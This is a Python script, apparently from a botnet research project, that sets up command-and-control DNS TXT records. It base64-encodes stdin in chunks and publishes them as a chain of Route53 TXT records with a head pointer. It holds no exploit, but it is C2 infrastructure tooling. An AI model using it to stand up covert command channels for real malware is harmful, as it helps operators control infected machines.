#!/usr/bin/env python3
## \file
# \brief CNC TXT REC set up script

# Copyright (c) 2019-2022 David Timber <dxdt@dev.snart.me>
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import sys
import base64
import prne_txtrec

# Error definitions
HOOK_ERRORS = {
	"NOT_IMPL": {
		"msg": "not implemented",
		"ec": 1
	},
	"AWS_NO_BOTO3": {
		"msg": "Please install Boto3 for AWS hook",
		"ec": 1
	},
	"INV_ARG": {
		"msg": "invalid argument",
		"ec": 2
	}
}

def main_aws (zone_id: str, head_rec: str, suffix: str, ttl: int):
	"""AWS hook main function"""
	if ttl is None:
		ttl = 3600

	try:
		import boto3
	except ModuleNotFoundError as e:
		prne_txtrec.handle_err(HOOK_ERRORS["AWS_NO_BOTO3"], e)

	client = boto3.client("route53")
	ins_q = [] # List of RRs to be inserted
	cnt = 0

	# process the queued request and clear the queue
	def flush_q ():
		prne_txtrec.change_all(client, zone_id, 'UPSERT', ins_q)
		ins_q.clear()

	while True:
		b = sys.stdin.buffer.read(189)
		if not b: # Assume that EOF is reached
			break

		ins_q.append({
			'Name': "%08u" % (cnt) + suffix,
			'Type': 'TXT',
			'TTL': ttl,
			'ResourceRecords': [
				{ 'Value': '"' + base64.b64encode(b).decode('ascii') + '"' }
			]
		})
		cnt = cnt + 1
		if len(ins_q) >= prne_txtrec.AWS_MAX_ITEMS:
			flush_q()

	flush_q()
	head_rr = "%08u" % (cnt) + suffix
	# insert the head rec
	prne_txtrec.change_all(
		client,
		zone_id,
		'UPSERT',
		[{
			'Name': head_rec,
			'Type': 'TXT',
			'TTL': ttl,
			'ResourceRecords': [
				{ 'Value': '"' + head_rr + '"' }
			]
		}])

HOOKS = {
	"aws": main_aws
}
USAGE_LINES = [
	"Usage: " + sys.argv[0] + " <head rec> <suffix> <hook> <zone id> [TTL]\n",
	"Hooks:\n"
]
for h in HOOKS:
	USAGE_LINES.append("  " + h + "\n")

def print_usage (out):
	out.writelines(USAGE_LINES)

# proecss argv
try:
	ARGV_DICT = {
		"head_rec": prne_txtrec.termdot(sys.argv[1].lower()),
		"suffix": prne_txtrec.termdot(sys.argv[2].lower()),
		"hook": sys.argv[3].lower(),
		"zone_id": sys.argv[4]
	}
	if len(sys.argv) >= 6:
		try:
			ARGV_DICT["ttl"] = int(sys.argv[5])
			if not (ARGV_DICT["ttl"] in range(0, 2147483648)):
				raise ValueError()
		except ValueError:
			prne_txtrec.handle_err(HOOK_ERRORS["INV_ARG"], None, sys.argv[5])
	else:
		ARGV_DICT["ttl"] = None
except IndexError:
	print_usage(sys.stderr)
	exit(1)

# call the function
try:
	HOOKS[ARGV_DICT["hook"]](
		ARGV_DICT["zone_id"],
		ARGV_DICT["head_rec"],
		ARGV_DICT["suffix"],
		ARGV_DICT["ttl"])
except KeyError:
	prne_txtrec.handle_err(HOOK_ERRORS["NOT_IMPL"], None, ARGV_DICT["hook"])

exit(0)
